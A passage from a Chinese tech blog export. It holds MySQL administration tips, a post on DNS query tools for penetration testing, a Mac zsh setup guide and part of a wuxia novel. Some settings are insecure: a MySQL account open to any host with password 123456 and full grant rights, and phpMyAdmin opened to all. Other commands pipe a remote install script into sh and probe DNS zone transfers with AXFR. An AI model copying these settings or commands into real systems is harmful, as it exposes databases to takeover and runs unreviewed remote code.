#(查看user表中的内容)+-----------+------------+-------------------------------------------+| host | user | password |+-----------+------------+-------------------------------------------+| localhost | root | *21D8392A6B4CA12B9D194ED3E245258C4BE56DBA || 127.0.0.1 | root | *930D8392A6B4CA12B9D194ED3E245258C4BE56DB |+-----------+------------+-------------------------------------------+5 rows in set (0.00 sec)mysql&gt; 可以看到，user表中目前只有一个root用户，并且host为127.0.0.1/localhost，也就是说root用户目前只支持本地ip访问连接。 第二步，修改表内容 增加一个用户，将host设置为%1mysql&gt;CREATE USER 'nmask'@'%' IDENTIFIED BY '123456'; 或者更改root用户的host字段内容1mysql&gt;update user set host = '%' where user = 'root'; 更改root用户的密码：1UPDATE user SET Password=PASSWORD('nmask') where USER='root'; 注意：初始化安装mysql时，默认可能只能用root用户登录，但默认root没有设置密码，因此一开始可以先给root用户添加一个密码进行登录。 flush(必须要flush，使之生效)：1mysql&gt;flush privileges; 查看用户1mysql&gt; select host,user from mysql.user; 再看下user表内容：123456789mysql&gt; select host,user,password from user;+-----------+------------+-------------------------------------------+| host | user | password |+-----------+------------+-------------------------------------------+| localhost | root | *21D8392A6B4CA12B9D194ED3E245258C4BE56DBA || 127.0.0.1 | root | *930D8392A6B4CA12B9D194ED3E245258C4BE56DB || % | nmask | *435A8F39F0791250895CA1DE2068FDC2CB477122 |+-----------+------------+-------------------------------------------+5 rows in set (0.00 sec) 可以看到user表中增加了一个用户nmask，host为%。 重启Mysql：1sudo /etc/init.d/mysqld restart 此时再用nmask用户远程连接下Mysql：123mysql -u nmask -p -h 192.168.2.2Enter password: mysql&gt; 连接成功，因为此用户host内容为%，表示允许任何主机访问此mysql服务。 用户权限很低当我用nmask账号登陆后，发现权限很低，具体表现为只能看到information_schema数据库。 解决方案在添加此用户时，就赋予其权限1234mysql&gt;INSERT INTO user -&gt; VALUES('%','nmask',PASSWORD('123456'), -&gt; 'Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y');mysql&gt;flush privileges; 或者123mysql&gt;CREATE USER 'nmask'@'%' IDENTIFIED BY '123456';mysql&gt;GRANT ALL PRIVILEGES ON *.* TO 'nmask'@'%' WITH GRANT OPTION;mysql&gt;flush privileges; 如果是phpmyadmin，可以通过root用户登陆后，进入user表进行修改。 最后重启Mysql：1sudo /etc/init.d/mysqld restart 自定义授权问题如果想nmask使用123456密码从任何主机连接到mysql服务器，其他密码不行，则可以：12mysql&gt;GRANT ALL PRIVILEGES ON *.* TO 'nmask'@'%' IDENTIFIED BY '123456' WITH GRANT OPTION;mysql&gt;flush privileges; 如果想允许用户nmask只能从ip为10.0.0.1的主机连接到mysql服务器，并只能使用123456作为密码。12mysql&gt;GRANT ALL PRIVILEGES ON *.* TO 'nmask'@'10.0.0.1' IDENTIFIED BY '123456' WITH GRANT OPTION;mysql&gt;flush privileges; 最后重启Mysql：1sudo /etc/init.d/mysqld restart 只能连接localhost？连接报错信息：1ERROR 2003 (HY000): Can't connect to MySQL server on '192.168.10.2' (111) 不能用192.168.10.2去连接。 解决方案修改/etc/my.cnf内容：1bind_address=127.0.0.1 改成 bind_address=192.168.10.2 重启mysql服务：1sudo /etc/init.d/mysqld restart 脱坑秘籍：通过mysql命令行修改内容后，要记得plush；如果还不生效，尝试restart mysql服务 报错：too many connections一般mysql默认最大连接数是100，当mysql连接数超过这个时，会报错此错；解决方案可以更改/etc/my.cof文件，更改最大连接上限。在[mysqld]中新增max_connections=N，如果你没有这个文件请从编译源码中的support-files文件夹中复制你所需要的*.cnf文件为到 /etc/my.cnf12345678910111213[mysqld]port = 3306socket = /tmp/mysql.sockskip-lockingkey_buffer = 160Mmax_allowed_packet = 1Mtable_cache = 64sort_buffer_size = 512Knet_buffer_length = 8Kread_buffer_size = 256Kread_rnd_buffer_size = 512Kmyisam_sort_buffer_size = 8Mmax_connections=1000 mysql服务重启出错mysql重启如果出错，可以先查看日志，在/var/log/mysql.log中查看具体的错误。一般来说，可能是权限问题，如果mysql是mysql用户权限，则需要切换到sudo su mysql用户下去启动mysql服务。 phpmyadmin 403问题安装完phpmyadmin与apache以后，访问http://localhost/phpmyadmin路径显示403。1sudo vim /etc/httpd/conf.d/phpMyAdmin.conf 编辑phpmyadmin.conf文件：12345678910111213141516171819&lt;Directory /usr/share/phpMyAdmin/&gt; AddDefaultCharset UTF-8 &lt;IfModule mod_authz_core.c&gt; # Apache 2.4 &lt;RequireAny&gt; #Require ip 127.0.0.1 #Require ip ::1 Require all granted &lt;/RequireAny&gt; &lt;/IfModule&gt; &lt;IfModule !mod_authz_core.c&gt; # Apache 2.2 Order Deny,Allow Deny from All Allow from 127.0.0.1 Allow from ::1 &lt;/IfModule&gt;&lt;/Directory&gt; 另外补充一下，如果要更改apache的端口，则可更改/etc/httpd/conf/httpd.conf文件。 Mysql性能优化mysql insert加速 insert是操作数据库最常用的动作，当有大量数据需要插入数据库时，性能至关重要，即插入数据的速度。mysql insert性能优化参考：http://blog.jobbole.com/29432/ 方案：一条SQL语句插入多条数据（亲测有效）将sql语句修改成以下类型，即一条sql语句插入多条数据，可大大提高插入效率。1INSERT INTO `insert_table` (`datetime`, `uid`, `content`, `type`) VALUES ('0', 'userid_0', 'content_0', 0), ('1', 'userid_1', 'content_1', 1); 修改后的插入操作能够提高程序的插入效率。这里第二种SQL执行效率高的主要原因有两个，一是减少SQL语句解析的操作， 只需要解析一次就能进行数据的插入操作，二是SQL语句较短，可以减少网络传输的IO。 方案：在事务中进行插入处理插入改成以下内容：12345START TRANSACTION;INSERT INTO `insert_table` (`datetime`, `uid`, `content`, `type`) VALUES ('0', 'userid_0', 'content_0', 0);INSERT INTO `insert_table` (`datetime`, `uid`, `content`, `type`) VALUES ('1', 'userid_1', 'content_1', 1);...COMMIT; 使用事务可以提高数据的插入效率，这是因为进行一个INSERT操作时，MySQL内部会建立一个事务，在事务内进行真正插入处理。通过使用事务可以减少创建事务的消耗，所有插入都在执行后才进行提交操作。 注意事项： SQL语句是有长度限制，在进行数据合并在同一SQL中务必不能超过SQL长度限制，通过max_allowed_packet配置可以修改，默认是1M。 事务需要控制大小，事务太大可能会影响执行的效率。MySQL有innodb_log_buffer_size配置项，超过这个值会日志会使用磁盘数据，这时，效率会有所下降。所以比较好的做法是，在事务大小达到配置项数据级前进行事务提交。 Mysql特殊字符编码问题存储报错有时会碰到在往mysql中存储一些特殊字符时（微信、qq表情等），会提示编码报错，类似如下：1(1366, "Incorrect string value: '\\xF0\\x9F\\x9A\\x80 D...’ for 存储特殊编码解决方案首先得明确，需要将mysql的utf8编码改成utf8mb4，utf8mb4是对utf8的补充，让其可以保存一些特殊字符。 修改数据库编码可以选择数据库，然后点击操作，排序规则改为：utf8mb4_general_ci 修改数据表编码选中数据表，点击操作，修改排序规则为：utf8mb4_general_ci 修改数据字段编码选择字段，点击修改，排序规则改为：utf8mb4_general_ci 修改代码中连接mysql的编码：这里以python为例子：1mysql_charset="utf8mb4" 说明：必须要以上4个编码都改成utf8mb4，才不会报错。 Python操作Mysql利用python开发时，经常会用到跟mysql相关的操作，这时候需要利用第三方库，MySQLdb。 MySQLdb安装1sudo pip install mysql-python 或者1sudo apt-get install python-mysqldb Usage导入模块1import MySQLdb 连接mysql数据库12conn=MySQLdb.connect(host="localhost",user="root",passwd="root",db="test",charset="utf8",connect_timeout=10) #connec_timeout连接超时时间 cursor = conn.cursor() 创建表结构12sql = "create table if not exists user(name varchar(128) primary key, created int(10))" cursor.execute(sql) 往表中写入数据12345sql = "insert into user(name,created) values(%s,%s)" param = ("aaa",int(time.time())) n = cursor.execute(sql,param) cursor.close()conn.commit() #必须要commit，不然数据只会缓存在本地，而不会真正的插入数据库 往表中写入多行数据123sql = "insert into user(name,created) values(%s,%s)" param = (("bbb",int(time.time())), ("ccc",33), ("ddd",44) ) n = cursor.executemany(sql,param) 更新表中数据123sql = "update user set name=%s where name='aaa'" param = ("zzz") n = cursor.execute(sql,param) 查询表中数据12345n = cursor.execute("select * from user") for row in cursor.fetchall(): print row for r in row: print r 删除表中数据123sql = "delete from user where name=%s" param =("bbb") n = cursor.execute(sql,param) 删除表12sql = "drop table if exists user" cursor.execute(sql) 提交commit1conn.commit() 关闭连接1conn.close() Python操作mysql优化问题1、commit操作放在最后，或者循环外面2、使用executemany，插入多条数据 时间墙@2017.07.28 添加mysql权限问题内容@2017.07.29 添加mysql基础命令、mysql性能优化、python操作mysql 本文将会持续添加mysql有关的问题]]></content>
      <categories>
        <category>技术研究</category>
      </categories>
      <tags>
        <tag>mysql</tag>
        <tag>数据库</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【渗透神器系列】DNS信息查询]]></title>
    <url>../../../../../../../../2017/07/12/1/</url>
    <content type="text"><![CDATA[Never put off what you can do today until tomorrow今日事今日毕 好久没有写文章啦，最近忙着换工作，搞事情，麻烦事一大推，凑空整理一篇DNS信息查询等工具用法吧。DNS查询在渗透或者运维工作经常遇到，尤其是内部有DNS服务器的公司，需要定时监测DNS解析的是否正常，有无被DNS劫持的情况。因此，学会一些工具快速查询检测DNS服务器状况显得尤为重要，本篇就介绍几款常见的DNS信息查询工具。 nslookup nslookup是用来监测网络中DNS服务器是否可以实现域名解析的工具，简单来说可以获取域名对应的ip。与ping的区别在于，nslookup返回的结果更丰富，而且主要针对dns服务器的排错，收集dns服务器的信息。（其实ping的过程也去请求了dns的记录，然后对ip发送icmp数据包） Usage非交互式（直接在shell中输入查询）：查询thief.one域名对应的ip，这里指定了前往114.114.114.114－dns服务器进行查询。1nslookup thief.one 114.114.114.114 查询thief.one域名DNS服务商。1nslookup -type=ns thief.one 查询thief.one的邮件服务器。1nslookup -type=mx thief.one 交互式（先输入nslookup，然后再输入命令）：12nslookup&gt; 进入交互式界面，输入查询命令123456&gt;set type=a #设置更改要查询的dns解析类型&gt;thief.one #输入要查询的域名&gt;set type=mx #设置更改要查询的dns解析类型&gt;thief.one&gt;server 114.114.114.114 #设置更改要查询的dns服务器地址&gt;ls thief.one #ls命令列出某个域中的所有域名 可以更改的type类型：1234567891011-A #A记录-AAAA-CNAME #CNAME纪录-HINFO-MB-MG-MR-MX #电子邮件交换记录，记录一个邮件域名对应的IP地址-NS #域名服务器记录,记录该域名由哪台域名服务器解析-PTR #反向记录,也即从IP地址到域名的一条记录-TXT #记录域名的相关文本信息 host与nslookup类似，也是查询域名对应的dns信息。 Usage1host -t A thief.one 参数 -a：显示详细的DNS信息； -c&lt;类型&gt;：指定查询类型，默认值为“IN“； -C：查询指定主机的完整的SOA记录； -r：在查询域名时，不使用递归的查询方式； -t&lt;类型&gt;：指定查询的域名信息类型； -v：显示指令执行的详细信息； -w：如果域名服务器没有给出应答信息，则总是等待，直到域名服务器给出应答； -W&lt;时间&gt;：指定域名查询的最长时间，如果在指定时间内域名服务器没有给出应答信息，则退出指令； -4：使用IPv4； host -6：使用IPv6. digUsage12345dig thief.one mxdig thief.one nsdig @202.106.0.20 thief.one a 指定dns服务器dig thief.one a +tcp 设置为tcp协议，默认为udpdig thief.one a +trace 这个参数之后将显示从根域逐级查询的过程 若http://thief.one的DNS服务器为10.0.0.1，且存在域传送漏洞，则使用dig @10.0.0.1 http://thief.one axfr即可查看所有域名了。 参数 @&lt;服务器地址&gt;：指定进行域名解析的域名服务器； -b：当主机具有多个IP地址，指定使用本机的哪个IP地址向域名服务器发送域名查询请求； -f&lt;文件名称&gt;：指定dig以批处理的方式运行，指定的文件中保存着需要批处理查询的DNS任务信息； -P：指定域名服务器所使用端口号； -t&lt;类型&gt;：指定要查询的DNS数据类型； -x：执行逆向域名查询； -4：使用IPv4； -6：使用IPv6； -h：显示指令帮助信息。 whoiswhois用来查询域名相关信息，比如注册人信息，电子邮件，域名提供商，ip信息等等。 Usage1whois -p port thief.one 更多用法可以使用man whois查看。 传送门【渗透神器系列】Metasploit【渗透神器系列】nc【渗透神器系列】nmap【渗透神器系列】Fiddler【渗透神器系列】搜索引擎【渗透神器系列】WireShark DNS信息在线查询的网站很多，可以参考下：SecWeb安全导航另外网上类似的文章很多很多啦，大家可以全去搜索下，这里只是列举了一些常见的工具，若有好的后面会持续补充。]]></content>
      <categories>
        <category>安全工具</category>
      </categories>
      <tags>
        <tag>渗透神器</tag>
        <tag>DNS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[定制化MacShell]]></title>
    <url>../../../../../../../../2017/06/27/1/</url>
    <content type="text"><![CDATA[Keep on going never give up！勇往直前，决不放弃！ 黑苹果用了将近半年，我也开始慢慢熟悉使用mac操作系统。然而之前我并没有真正发挥出mac高效率的一面，而只是停留于最基础的使用，为了能更高效的使用mac，近期我搜集了一些高效优雅地使用mac的案例，准备实操一番并做些记录。 如何高效地使用Mac？面对这个问题，我们可以从如何优雅地使用shell（也就是终端）开始探讨。首先不得不说mac自带的shell功能已经很强大了，但为了更好地办公，我们能做得还有很多。本篇将介绍几款Mac下shell增强工具（插件），使得Macshell的功能更加强大。 iterm2安装比较简单，官网下载一个安装包即可。 Usage智能选中： 双击选中字符串； 三击选中整行； 四击智能选中； 按住⌘键： 可以拖拽选中的字符串； 点击url，调用默认浏览器访问该网址； 快捷键： 切换tab：⌘+←, ⌘+→, ⌘+{, ⌘+}；⌘+数字直接定位到该tab； 新建tab：⌘+t； 顺序切换 pane：⌘+[, ⌘+]； 按方向切换 pane：⌘+Option+方向键； 切分屏幕：⌘+d水平切分，⌘+Shift+d垂直切分； 智能查找，支持正则查找：⌘+f； 自动补齐，按⌘+;； 弹出历史记录窗口，按⌘+Shift+h； 找到当前鼠标，⌘+/； oh my zsh 我们平常在mac上使用的shell通常都是bash-shell，而mac以及linux有另一款自带的shell异常强大，它就是zsh-shell。bash-shell的配置通常可以在用户目录下.bash_profile文件内设置，而zsh-shell同样可以在用户目录下.zshrc文件内设置。 由于zsh-shell是完全可定制化的，因此出现了一款开源工具–oh my zsh，它是一个开源的、社区驱动的框架，用来管理ZSH配置。 项目地址https://github.com/robbyrussell/oh-my-zshhttp://ohmyz.sh 安装1$ sh -c "$(curl -fsSL https://raw.github.com/robbyrussell/oh-my-zsh/master/tools/install.sh)" 或者：1sh -c "$(wget https://raw.github.com/robbyrussell/oh-my-zsh/master/tools/install.sh -O -)" 配置切换到zsh-shell，可以通过命令行输入zsh进行查看。或者设置shell启动开启zsh而不是bash：oh-my-zsh有许多插件和主题，可以去 ~/.zshrc 配置。 autojumpautojump是一款可以快速切换到指定目录的shell插件，支持模糊匹配，tab补全等功能。 项目地址https://github.com/wting/autojump 安装1brew install autojump 配置安装完以后终端直接输入autojump，如果没有报错，则说明安装成功。如果遇到：1please source the correct autojump file in your shell\'s startup file. 则将以下内容添加到~/.zshrc文件末尾：（安装完oh my zsh会在用户目录下出现一个.zshrc文件）1[ -f /usr/local/etc/profile.d/autojump.sh ] &amp;&amp; . /usr/local/etc/profile.d/autojump.sh 然后设置.zshrc文件中的plugins=(git autojump)。配置完以后在终端输入：1source .zshrc 用来启用.zshrc配置，或者注销用户重启shell来生效。 使用1j 关键字 注意：只有曾经访问过的目录，才能用autojump快速进入。 zsh-autosuggestions这是一款可提示历史命令的shell插件。 项目地址https://github.com/zsh-users/zsh-autosuggestions 安装1git clone git://github.com/zsh-users/zsh-autosuggestions ~/.zsh/zsh-autosuggestions 配置vim .zshrc写入以下内容:1source ~/.zsh/zsh-autosuggestions/zsh-autosuggestions.zsh 配置完以后在终端输入：1source .zshrc 启用.zshrc配置，或者注销用户重启shell来生效。 使用 icdiffdiff的美化增强版，文件差异对比工具。 项目地址https://github.com/jeffkaufman/icdiff 安装1pip install git+https://github.com/jeffkaufman/icdiff.git 使用 httpiecurl美化版，格式化输出结果。 项目地址https://github.com/jakubroztocil/httpie/ 安装1brew install httpie 使用]]></content>
      <categories>
        <category>技术研究</category>
      </categories>
      <tags>
        <tag>Mac</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【原创小说】刺青]]></title>
    <url>../../../../../../../../2017/06/22/1/</url>
    <content type="text"><![CDATA[用刺青，刻下凄美的伤疤，无法抹去，深入骨髓 怀旧原创小说三部曲，这是最后一篇了，相信我，发完这篇我不会再发小说，是时候该好好研究研究技术了，不能整天不务正业。 [1.0］ 刺青，是用带有颜色的针刺入皮肤底层而在皮肤上制造一些图案或字眼出来，代表着个性或者某种身份。 在一般人看来，身上如若刻上刺青，则刺青背后一定隐藏着一段不可告人的秘密。很不幸的是，从我记事起，我左手臂上就刻有莲花刺青，而我可以对天发誓，我完全不知道，这块抹不去的刺青到底蕴藏着什么秘密。为了能解开刺青的奥秘，每当与梅生裸身泡在清溪中时，我必定用手指戳一戳梅生手臂上的莲花刺青，然后直勾着眼问：“梅哥，你说我俩手臂上的莲花刺青，到底蕴藏着啥秘密啊？难不曾是藏宝地图！”。 梅生慵懒地打着哈欠，很不耐烦地说道：“我说阿青，你都问了第九百九十九次了，你不烦我还烦呢！”，说完嫌弃地瞥了我一眼，仰天躺在清溪中呼呼大睡起来。 我气得连滚带爬上了河岸，从裤腰带里拔出一把小刀，对着河中的梅生喊道：“你再不说，我就把手臂上的莲花削去”。我心想吓唬吓唬他，凭借着我们从小共用一条裤腰带的交情，想必他也不会这么无情。不过随后我就发现，这只是我一厢情愿，梅生的呼噜声更响了，显然掩盖了我的叫喊。我灵机一动，拿起梅生的衣服就往家跑。当我回望着清溪，梅生已经赤裸着身子站在岸边，用水草遮掩私处，嘴里骂道：“刺青，你这个混蛋！”。 随后，在我日复一日的纠缠下，梅生终于说出了莲花刺青的秘密，结果却让我失望之极。他说，二十年前我们被一伙人贩子拐卖到风莲国，为了防止我们逃跑，他们请刺青师在我们身上刻下了相同的莲花刺青,后来因为战乱我俩逃了出来，从此相依为命。原本我是不相信梅生的鬼话的，可谁让他虚长我十岁呢，况且在我记忆里，儿时的生活就是与梅生一起的。更何况，看见他满脸可怜相，两眼汪汪地望着我，如同他第一次叫我刺青时，看我的眼神，让我不得不信。 二十年前，当我与梅生首次踏入风莲国，梅生奸笑着用他迷离的眼神盯着我说：“我们以后就要在此生活了，从现在开始，你就叫刺青，而我叫梅生”，我傻不啦叽地点了点头。如今，每每回想起此事，我都后悔不已，曾今的年少无知，让我被人叫了二十年的刺青。当我受不了别人的嘲讽，终于有一天把刀架在梅生的脖子上时，梅生委屈地从眼中挤出几滴泪，三言两语地说服了我，“你手臂刻有的刺青，就如同你的名字将伴随你一生，我是顺应天意也”。也许，我是真的太傻太天真，竟然相信了他的鬼话，全然没想到他手臂上的刺青与我分毫不差。 直到我赚到了第一桶金，我不得不相信梅生嘴中的天意。谁让我选择了刺客这条不归路呢，由此又是伴随我生命中一个刺字。刺客这个行当，看似潇洒，实则是哑巴吃黄连，有苦说不出啊，名副其实的高风险职业，不像戏子梅生那么清闲自在。每个月黑风高的夜晚，当梅生在舞台上摆弄着身姿，炫耀着腔调，我却游走于风口浪尖，潜入深门高墙之内。同样是化妆，梅生化得光彩照人，为的是吸引眼球，而我只需一席黑衣，一块面纱，为的是避人耳目。 每次筋疲力竭地回到家，看着梅生对着铜镜摆弄着身姿，我都不由一阵恶心。以至于，我采了无数的荷花叶，每晚对着莲花刺青反复涂搽，心想只要抹去了刺青，我就能摆脱天意，摆脱这种生活。谁知没等我看到希望，梅生便向我心头泼了盆冷水。他说，用刺青，刻下凄美的伤疤，无法抹去，深入骨髓。 我气得全身发抖，随即把他狠狠地揍了一顿，指着他的鼻子说：“我的伤疤只有凄凉，你的全是美丽，我俩一起才是凄美”。梅生摸着乌青的脸颊，指着愤然离去的我，说：“臭小子，让你别打脸，你让我拿什么混饭吃，你有种，晚上别回来了！”。 [2.0］ 位于大地之中的风莲国山明水秀，古色古香，城内的渭河贯穿南北，九曲回肠。城中渭河上，架空着一座金碧辉煌的香楼，碧瓦朱甍，高耸入云。香楼正门上“云烟楼”三个金色大字跃然于眼前。 云烟楼内不时传出几许欢声笑语，想必是姑娘们琴棋书画精通绝伦，美貌身姿惊人，引得官商富人发出淫邪的恶笑。每每望着姑娘们的舞姿，他们就会忘乎所以，口水不免飞流直下。作为一名冷血刺客，面对如此烟云，我丝毫不会深陷其中，直到遇见了月姬。月姬是云烟楼最有名的歌伎之一，她的一颦一簇都足以让看客神魂颠倒。然而，最让人销魂的还是她的琴声，每一弦都沁入身心，深入骨髓，让人深陷其中，无法自拔，“转轴拨弦三两声，未成曲调先有情”。 因为月姬，每当被梅生赶出家门，我都流落于云烟楼中，享受着轻歌曼舞，言笑晏晏。与其他客人不同的是，我只要求月姬相陪，即使她只卖艺不卖身，我也会重金相邀房内，举酒言欢，静静地欣赏着她弹奏离歌赋。 酒入肚囊，醉上心头，迷糊地望着眼前的月姬，我似乎找到了知己，倒头栽入月姬怀中哭诉着自己的委屈伤痛。天光极盛，刺入眼帘，我掀开被子，望着坐在窗前抚琴的月姬，尴尬地笑道：“姑娘，昨晚饮酒过甚，让你受惊了”。月姬起身摆好木琴，转身微微低着头望向我，微红的脸上写满羞涩。窗外清风徐徐，吹动着月姬的长发，风中衣袂飘飘，随风飘来的是淡淡的清香，我一时入了迷，全然不知月姬已离开了房间。 此后，每当完成任务收到赏金后，我都会夜留于月姬的闺房之内。月姬也习惯地拿出我最爱的女儿红，然后美美地弹奏着《春江花月夜》。酒过三巡，曲消音散，我依靠着窗台，望着浩瀚星海，抚摸着手臂上的刺青。除了梅生，谁也不知道我手臂上的刺青，包括月姬。原本她应该是会知道的，直到那天她在台上翩翩起舞，莺歌燕舞间清风吹起了她的长袖，透过薄薄的轻纱，一朵莲花刺青显露于手臂。后来，我从梅生口中得知，当年与我们一起被刻上刺青的还有一名女孩，现如今她已沦落云烟之地，艺名月姬。 正因为此事，我打消了向月姬显露刺青的计划，原因就在于不想打破她现在的生活，而让她因为自己勾起伤心往事。也是从那天起，我开始不接林枫的生意。作为刺客，难免身处险境，若是被人发现手臂上的刺青，不仅连累梅生，更会连累月姬，毕竟月姬手臂上的刺青早已不是什么秘密。世人永远是庸俗的，同样的刺青，刻在月姬身上，就成为了取悦眼球的纹饰。 林枫是林家堡主林天南的公子，家财万贯，声震武林。此人风度翩翩，温文尔雅，长得更是神明爽俊，目若朗星。至于此前我与他唯一的交集，也就是生意上的往来。以我的职业来说，生意上的往来就是他付钱，我杀人。像他这样的名门望族子弟，是不可能冒险行刺的，而林门仇家众多，因此我就成了林枫最好的生意伙伴。 我们的交易场所往往选择在云烟楼，此地云烟四起，歌舞淫乐间，谁也不会在意我们谈论的内容，即使有所耳闻，也全当酒后的胡言。即便如此，我们的接头也不能随随便便。每当林枫往酒杯倒酒，而后将酒壶壶嘴对着酒杯时，则寓意有活可接，而酒杯内酒的多少就寓意刺杀任务的难度高低。若是以往，我二话不说便上前拿起酒杯喝下，示意接下此活。而如今，我要么置之不理，要么上前拿起酒杯，洒向地面，示意此活接不了。 随着时光的流逝，原本以为再也不会接手林枫的买卖，可现实总归存在无奈。每当身处月姬闺房，抱着怀中的人间尤物，为她赎身的想法便浮动在脑海中。然而，巨额的赎身金像一块巨石重重压在我的心头，数月夜寝于云烟楼的生活，已花完了我所有的积蓄，此时唯有出山才能筹得赎金。 捆紧纸条，放飞的白鸽翱翔于蓝天下，飞往林家堡。 [3.0］ 隔日黄昏，林枫摇曳着纸扇，踏进了云烟楼。随即，楼内砸开了锅，姑娘们纷纷涌向眼前的豪门公子，不知不觉中姑娘们的芙蓉色上衣已经敞开，露出白皙的锁骨，扭腰弄眉地围绕着林枫。林枫还是一贯的孤傲，如同几年前的第一次相遇，撇着眼对我露出不屑的眼神，尽管眼前美女如云，他也不正眼相看。 林枫径直地走向我，待到跟前，俯身贴近我微醉的脸庞，深深相惜，此情此景真是羡煞云烟楼的姑娘。我一手酒瓶一手酒杯，尴尬地笑道：“林兄，我可没那癖好！”。林枫贴着耳朵苦笑道：“为了避开云烟楼的姑娘们，刺兄，只能委屈你了！”，随即抢过我手中的酒杯，饮下后放声大笑。留下我无辜地望了望身旁的月姬，撇着嘴直摇头。 林枫拉起卧倒在墙角的我，轻声说道：“此次任务事关重大，你我房内相商”，我借着酒劲一头栽进林枫的怀中，两人缠绵着步入厢房，留下姑娘们一脸的茫然，唯独月姬抿着嘴独乐。 厢房内，林枫摆好酒杯，往里缓缓倒酒。酒杯中，暗褐色的酒水由浅变深，直至溢出杯口。我二话不说，上前拿起酒杯喝下，对着林枫说道：“只要赏金足够，其他的不用多说”。话虽如此，我也不能胡乱接活，如若接了自己能力所不及的，怕是要丢了性命。林枫与我表面上算是生意伙伴，实则通过几年的合作，也建立了兄弟情义。他能交给我的活，必定是不会伤及我性命的。 直到入夜，我隐匿于相天府深墙之上，偷偷望着深墙内密集的兵力，回想起自己对林枫说的话，肠子都悔青了。林枫凭借着几年的情义，骗取我的感情，把我往火堆里推。我心想着，回去一定要多收点赏金，要不然就绝交。 还没等我气消，交替巡逻的近卫队就发现了我的踪影。只见他们快速散开阵型，对我形成了包围阵势。眼见自己被围得水泄不通，我只能无奈地望着头顶飞过的乌鸦，心想着插翅也难逃了。不过作为一名敬业的刺客，若是束手就擒则显得太没有职业道德，于是我亮出了弯刀，脚尖轻点深墙之上，轻身飞跃于屋瓦之间。 明月之下，弯刀闪现着寒光，身影过处，尸骸一片。激战维持了几个时辰，最终以我体力不支告负。刀光剑影间，我身受数刀，血流不止，直至被死死地逼在深墙之内。当我束手无策之时，一道黑影闪过，随即惨叫声此起彼伏。 黑影见机背起我往墙外飞去，只见他身轻如燕，一转眼便逃离了包围圈。驮负在黑影上，我轻轻地敲了敲黑衣人的脑袋，哭丧着说道：“好你个梅生，现在才来救我，可怜我满身是伤”。梅生解下面纱，大笑道：“你活该，将军府你都敢闯，这不是找死吗！要不是月姬找到我，请求我暗中保护你，你早已是死人啦”。 我敲打着梅生的后背，埋怨道：“这得怪你，拥有绝世的轻功，却甘心当一名戏子，害得我每夜只身一人游走于死亡边缘，我好惨啊！”。梅生打着哈气，慵懒地说道：“你再啰啰嗦嗦，唧唧歪歪，我就把你扔下去，到时你才叫惨！”。我朝他后脑勺翻了翻白眼，身子一摊重重地压在他身上，随即缓缓地闭上双眼，安心入睡。 次日清晨，天光透过纸窗刺入眼帘。月姬坐在床前，手里端着热汤，睁着水灵的眼温柔地看着我，不时用嘴吹散汤中的热气。我微笑着喝下月姬亲手熬制的良药，良药虽苦，入口即甜啊！ 原本以为林枫再也没脸来见我了，谁知他的脸皮不是一般厚。临近正午，林枫提着几包礼品，登门造访，我黑着脸指着他的鼻子骂道：“要不是看在你替月姬赎身的份上，我早揍你了！”。林枫脸上也略显尴尬，羞愧地说道：“刺兄，此次是我没有设想周全，让你受苦了”。看在钱的面子上，此事也就不了了之了，况且我也实在不想失去财主，好在也没伤及性命。 此次受伤后，我再也没有接过活，整日游走于梅生的戏场与林家堡之间。梅生对戏曲的兴趣极其浓厚，当年他拿出所有的积蓄加入了老戏班，经过十几年的摸爬滚打，如今他已是戏班主，绝对的风莲城第一名角。至于我们的轻功，则是梅生无意中捡到一本武功秘籍，我们起初只是随着瞎练，没想到却练就得身轻如燕。而我造访林家堡的目的，就是为了拿取生活的补贴，全当是林枫为我受伤付的赔偿金。而继那次受伤后，林枫待我如亲兄弟，林家堡像是对我设有特权，出入自由。 当然，我也不是厚颜无耻之徒，拿满一年的赔偿金后，我与月姬合计着开了一家酒馆，凭借着月姬的美艳，顾客自然是络绎不绝，生活也总算开始平静而滋润。 [4.0］ 高老爷的死，是林枫急急忙忙告诉我的。据林枫说，高老爷是被人用利器直插心脏，一命呜呼的。官府为了找出元凶，在城内贴出皇榜，虽说凶手蒙着面，但高老爷的家丁看见了凶手手臂上刻着刺青。 林枫硬拉着我，挤进皇榜前的人群。只见皇榜上的通缉犯蒙着黑纱，而在他的左手手臂上鲜明地刻着莲花刺青。此时，我的脑海中首先浮现出的是月姬，于是连忙挤出人群，跑回酒馆。奔跑间，远远地望见，军队包围了我们的酒馆，而月姬被上了手铐脚镣，押进了囚笼。我愤怒地奔跑着，伸手想要亮出弯刀，却被藏在角落的梅生死死地挡住。 兵头询问着月姬，“凶手手臂的刺青与你手臂上的无异，你可认罪？”。月姬摸了摸手臂上的莲花刺青，大笑道：“没错，我就是凶手，是我杀死高老爷的，与任何人无关！”。望着囚笼里远去的月姬，我痛彻心扉。 数月前，月姬知道我手臂上的莲花刺青后，便托付终身。而今，她为了我甘愿牺牲性命。我极力挣脱了梅生，死命地奔向月姬，迎面而来的却只有滚滚的烟尘，以及月姬远去的背影。 林家堡内，林枫、梅生与我围坐一地，商讨着劫狱大计。我们的计划是，以梅生为诱饵，引开监牢外的守军，然后由我潜进监牢救出月姬，林枫则负责出现意外时的救援，以及救援成功后接头我们逃离风莲国。次日深夜，一行黑影隐匿于监牢外的竹林。我抬头仰望着夜空，眼看着即将乌云盖月，随即示意梅生行动开始。梅生终身一跃，脚尖轻弹于竹林之上，踏着竹叶，迎着黑风，翻身至监牢之外。 牢外的守军，纷纷前去追赶，梅生凭借着超凡的轻功，轻松翱翔于守军头颅之上，向竹林深处飞去。望着远去的守军，我赶忙飞身至监牢大门外。放眼监牢内，灯火通明，却异常的安静。脑海浮现出月姬的身影，我奋不顾身地步入监牢，四处寻找着月姬。然而，我所到之处，全都是空无一人。而在此时，门外传来密集的脚步声，我深知中计，便纵身飞向头顶的天窗，不料一张大网从天而降，重重地把我压倒在地。透过绳网，传来阵阵冷笑。随后，我被押进了囚笼，前往秘密监牢，而埋伏于竹林的救援队迟迟没有行动。 次日，我被五花大捆地押进位于地底的秘密监牢。牢笼里的月姬，哭喊着我的名字，泪已流干。狱头狠狠地把我揣进牢笼，望着眼前满身是伤的月姬，我心如刀绞。我轻拂着月姬的脸颊，将其拥于怀中，用手一遍遍地梳理着她的乱发。月姬像是一只受惊的小猫，死死地抱着我，空洞的眼神中透露着绝望。 